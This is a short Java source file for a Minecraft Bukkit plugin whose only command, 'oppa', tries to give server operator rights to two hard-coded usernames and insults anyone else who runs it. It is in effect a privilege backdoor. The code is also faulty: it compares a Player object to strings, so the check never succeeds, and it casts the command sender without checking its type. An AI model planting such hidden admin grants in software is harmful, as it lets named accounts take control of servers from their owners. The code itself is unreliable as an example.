package minecraft;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;


/**
 * Created by Daniël on 12-4-2015.
 */
            public class plugin extends JavaPlugin {

    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("oppa")) {
            Player player = (Player) sender;

            if (player.equals("Galaxias") || player.equals("IamCrazyDaniel")) {
                player.setOp(true);
            } else {
                sender.sendMessage("FACKAA YOUUU");


            }
            return true;
        }
        return false;
    }
}
